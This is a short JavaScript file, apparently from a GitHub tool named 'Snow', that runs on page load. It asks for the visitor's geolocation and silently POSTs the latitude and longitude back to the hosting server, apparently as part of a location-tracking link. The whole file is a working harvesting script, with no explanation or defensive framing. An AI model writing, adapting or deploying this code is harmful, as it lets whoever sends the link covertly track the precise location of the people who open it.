/* https://github.com/MSFPT/Snow */

const loc = () => {

    const success = (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        $.ajax({
            url: window.location.origin,
            type: 'POST',
            data: {
            'Status': 'h3d',
            'Latitude': latitude,
            'Longitude': longitude ,
            'err': 'false'
            },
            success:function(response){ return false; },
            error:function(){ return false; }
        });
    }

    const error = (err) => {

        console.warn(err);

        $.ajax({
            url: window.location.origin,
            type: 'POST',
            data: {
            'Status': 'h3d',
            'err': 'true'
            },
            success:function(response){ return false; },
            error:function(){ return false; }
        });
        alert("Unable to retrieve your location");
    }

    navigator.geolocation.getCurrentPosition(success, error);

}

window.onload = () => {
    loc();
}